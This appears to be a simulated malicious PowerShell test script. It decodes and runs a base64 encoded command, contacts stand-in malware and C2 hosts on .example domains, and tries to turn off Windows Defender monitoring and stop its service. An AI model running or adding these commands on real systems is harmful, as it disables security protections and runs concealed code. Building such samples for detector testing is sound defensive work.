# Parent script that executes test_child.ps1
$ErrorActionPreference = 'SilentlyContinue'

# Known malicious PowerShell patterns
$base64payload = "cG93ZXJzaGVsbC5leGUgLWVuY29kZWRjb21tYW5kIEpBQndBRzhBZHdCbEFISUFjd0JvQUdVQWJBQnNBQzRBWlFCNEFHVUFJQUF0QUVVQWJnQmpBRzhBWkFCbEFHUUFZd0J2QUcwQWJRQmhBRzRBWkFBZ0FDY0FKQUJRQUVFQVZBQklBQ0FBUFFBZw=="
$decodedPayload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64payload))
Invoke-Expression $decodedPayload

# Execute child script with suspicious behavior
$child_path = Join-Path $PSScriptRoot "test_child.ps1"
if (Test-Path $child_path) {
    & $child_path
}

# Add known malicious network patterns
$urls = @(
    "http://malware-domain.example/payload.exe",
    "http://evil-c2-server.example/beacon",
    "http://ransomware-payment.example/wallet"
)
foreach ($url in $urls) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadString($url)
    } catch {}
}

# Attempt to disable security features
try {
    Set-MpPreference -DisableRealtimeMonitoring $true
    Stop-Service "WinDefend" -Force
} catch {}
